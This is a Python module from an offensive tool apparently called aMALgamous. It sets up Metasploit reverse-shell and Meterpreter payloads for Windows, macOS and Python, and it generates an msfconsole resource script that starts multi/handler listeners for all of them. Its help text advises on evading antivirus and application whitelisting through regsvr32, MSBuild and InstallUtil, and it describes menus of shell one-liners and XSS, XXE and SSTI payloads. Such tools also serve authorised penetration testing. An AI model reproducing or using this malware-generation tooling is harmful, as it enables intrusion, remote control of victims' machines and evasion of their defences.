#! /usr/bin/env python3

## File That has all of the common services
import errno
import time
import atexit
import readline
import os
import netifaces as nic
import random
import string
import shutil

histfile = os.path.join(os.path.expanduser("~"), ".aMALgamous_history")

try:
    readline.read_history_file(histfile)
    h_len = readline.get_current_history_length()
except FileNotFoundError:
    open(histfile, 'wb').close()
    h_len = 0


def save(prev_h_len, histfile):
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, histfile)


atexit.register(save, h_len, histfile)


class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    WHITE = '\033[97m'
    ERROR = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Loopback ip
listener_ip = "127.0.0.1"
# assumed wired interface
interface = "eth0"
# assumed wireless interface
winterface = "wlan0"
# Install location
loc = os.getcwd()
# Malware output file
targetfile = loc + "/aMALgamation/current/autoMAL/"


# Random Port
def randomPort(stringLength=5):
    number = '54321'
    return ''.join(random.choice(number) for i in range(stringLength))


# 32 bit MET Port
METRT32_PORT = randomPort(4)
# 32 bit MET Stageless Port
METRT32_SL_PORT = randomPort(4)
# 64 bit MET Port
METRT64_PORT = randomPort(4)
# 64 bit MET Stageless Port
METRT64_SL_PORT = randomPort(4)
# 32 bit SHELL Port
SHELL32_PORT = randomPort(4)
# 64 bit SHELL Port
SHELL64_PORT = randomPort(4)
# 32 bit SHELL Stageless Port
SHELL32_SL_PORT = randomPort(4)
# 64 bit SHELL Stageless Port
SHELL64_SL_PORT = randomPort(4)
# Python MET Port
METPY_PORT = randomPort(4)
# Python SHELL Port
SHELLPY_PORT = randomPort(4)
# OSX 32 bit SHELL Port
SHELLOS32_PORT = randomPort(4)
# OSX 64 bit SHELL Port
SHELLOS64_PORT = randomPort(4)
# DNS Port
DNSPORT = '53'

# 32 bit MET payload
METRT32_Payload = "windows/meterpreter/reverse_tcp"
# 32 bit MET Stageless payload
METRT32_SL_Payload = "windows/meterpreter_reverse_tcp"
# 64 bit MET payload
METRT64_Payload = "windows/x64/meterpreter/reverse_tcp"
# 64 bit MET Stageless payload
METRT64_SL_Payload = "windows/x64/meterpreter_reverse_tcp"
# 32 bit SHELL payload
SHELL32_Payload = "windows/shell/reverse_tcp"
# 64 bit SHELL payload
SHELL64_Payload = "windows/x64/shell/reverse_tcp"
# 32 bit SHELL Stageless payload
SHELL32_SL_Payload = "windows/shell_reverse_tcp"
# 64 bit SHELL Stageless payload
SHELL64_SL_Payload = "windows/x64/shell_reverse_tcp"
# Python MET payload
METPY_Payload = "python/meterpreter/reverse_tcp"
# Python SHELL payload
SHELLPY_Payload = "python/shell_reverse_tcp"
# OSX 32 bit SHELL payload
SHELLOS32_Payload = "osx/x86/shell_reverse_tcp"
# OSX 64 bit SHELL payload
SHELLOS64_Payload = "osx/x64/shell_reverse_tcp"
# DNS 32 bit SHELL Payload
SHELLDNSWIN = "windows/shell/reverse_tcp_dns"


def archFile():
    # Createing the output file
    if not os.path.exists(targetfile):
        os.makedirs(targetfile)
    # archive the old version
    today = time.strftime("%Y%m%d-%H%M")

    archivefolder = loc + "/aMALgamation/archive" + today
    try:
        os.makedirs(archivefolder)
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise
    files = os.listdir(targetfile)
    for f in files:
        shutil.move(targetfile + f, archivefolder)
    print(bcolors.ERROR + bcolors.BOLD + "\t\tAll content in {0} being moved to {1}\n".format(targetfile,
                                                                                              archivefolder) + bcolors.ENDC)


# Random Letter Strings
def randomString(stringLength=6):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))


def randomSSSHH(stringLength):
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(letters) for i in range(stringLength))


def get_local_ip(iface):
    try:
        nic.ifaddresses(iface)
        local_ip = nic.ifaddresses(iface)[2][0]['addr']
        return local_ip
    except:
        pass


def rc_file():
    global listener_ip

    print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
    msf_resource_file = open(targetfile + "ALL-Payloads.rc", "w")
    msf_resource_file.write("""use multi/handler
set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j

set payload %s
set LHOST %s
set LPORT %s
set ExitOnSession false 
exploit -j
""" % (METRT32_Payload, listener_ip, METRT32_PORT, METRT32_SL_Payload, listener_ip, METRT32_SL_PORT, METRT64_Payload,
       listener_ip, METRT64_PORT, METRT64_SL_Payload, listener_ip, METRT64_SL_PORT, SHELL32_Payload, listener_ip,
       SHELL32_PORT, SHELL32_SL_Payload, listener_ip, SHELL32_SL_PORT, SHELL64_Payload, listener_ip, SHELL64_PORT,
       SHELL64_SL_Payload, listener_ip, SHELL64_SL_PORT, METPY_Payload, listener_ip, METPY_PORT, SHELLPY_Payload,
       listener_ip, SHELLPY_PORT, SHELLOS32_Payload, listener_ip, SHELLOS32_PORT, SHELLOS64_Payload, listener_ip,
       SHELLOS64_PORT, SHELLDNSWIN, listener_ip, DNSPORT))
    msf_resource_file.close()


def helpm():
    print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
    print("""
  Listener IP: Is the command and control server that will be under your control. It is the system that you want the 
  connection to go to. 
  
  Malware Creation 1: There are options within this menu that allow you to create custom payloads, traditional payloads,
  or autoMAL (which is a battery of different payloads)
  
  Shell Cheat 2: This menu gives you single line shell payloads. It can be used for many different program languages and 
  OS types. 
  
  Web Payload: This will give you different types of payloads for web type attacks. Mainly cross site scripting, 
  XML external entity, and server side template injection
  
  There is also history built in so you can us the up or down arrow to select what you have used in the past. 
  
  press (H) on any menu for some help. 
  """)


def help1():
    print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
    print("""
  Generate all Malware 1: You can select this to generate a bunch of payloads. These payloads are the good, the bad, the
  ugly. I would recommend this for basic users, however, much of them will be caught by AV, use regsrv32 or msbuild if 
  you want to be low and slow.
  
  Generate only Bypass 2: You can select this if you only want to use bypass techniques. 
  
  Generate Marantral the Mantroll Special 3: Things that I like to use. 
  
  Generate only Malware that does not use Meterpreter 4: Met payloads tend to be caught by advanced AV. This could be 
  a good option if your target is mature. 
  
  Generate only MAC and Python Malware 5: This selection will be nice for attacking MAC devices. 
  
  Customize Malware 10: For more advanced users. I would not recommend if you are just starting out. 
  
  99 to go back to the main menu!

  There is also history built in so you can us the up or down arrow to select what you have used in the past. 

  press (H) on any menu for some help. 
  """)


def help1c():
    print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
    print("""
    MSVenom Created Malware 1: This option will just help you create MSVenom type payloads. They are not placed in any
    other method. This is for someone that wants aMALgamous to help create a payload within say PHP or something like 
    that. I try to help walk you through as much as I can. 

    Regsrv32 Malware 2: I have been using this one for years and it still works more than it doesn't. A little tip, use 
    SMB to pass the payload. Never put it on the target!!  

    MSBuild Malware 3: Works great, but have been having some issues with the basic shell being caught. I will be 
    developing it more in the future. This will bypass many types of advanced AV.

    InstallUtil Malware 4: Great option for bypassing Advanced AV or Application Whitelisting. I would make sure that
    the payload is not Meterpreter if that is the goal.

    99 to go back to the main menu!

    There is also history built in so you can us the up or down arrow to select what you have used in the past. 

    press (H) on any menu for some help. 
    """)


def help1v():
    print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
    print("""
    Generate Windows 32bit payload 1: Creates a basic 32bit msfvenom exe.

    Generate Windows 64bit payload 2: Creates a basic 64bit msfvenom exe.

    Generate Mac 32bit payload 3: Creates a basic 32bit msfvenom exe.

    Generate Mac 64bit payload 4: Creates a basic 64bit msfvenom exe.
    
    Generate Custom payload 5: This one is a bit tricky. We will try to help you make any payload and we walk you through
    it. You should have a good idea what you want. Not all payloads will work.

    99 to go back to the main menu!

    There is also history built in so you can us the up or down arrow to select what you have used in the past. 

    press (H) on any menu for some help. 
    """)


def help2():
    print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
    print("""
    Pick what you want. It will randomize naming within the oneliner as well as the port numbers. If you want to you can 
    set the port after you generate it. 
    
    There is also history built in so you can us the up or down arrow to select what you have used in the past. 

    press (H) on any menu for some help. 
    """)


def help3():
  print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
  print("""
    XSS Payloads 1: Has a large list of cross site scripting examples.

    XXE Payloads 2: Has a large list of XML external entity examples.
    
    SSTI Payloads 2: Has a large list of server side template examples.

    99 to go back to the main menu!
    
    There is also history built in so you can us the up or down arrow to select what you have used in the past. 
    In this section you can also tab out the request.

    press (H) on any menu for some help. 
    """)

def help3ti():
  print(bcolors.GREEN + bcolors.UNDERLINE + bcolors.BOLD + "\t************** HELP **************" + bcolors.ENDC)
  print("""
    Pick a payload and it will show you an example and description of the usage.

    99 to go back to the main menu!

    There is also history built in so you can us the up or down arrow to select what you have used in the past. 
    In this section you can also tab out the request.

    press (H) on any menu for some help.
    """)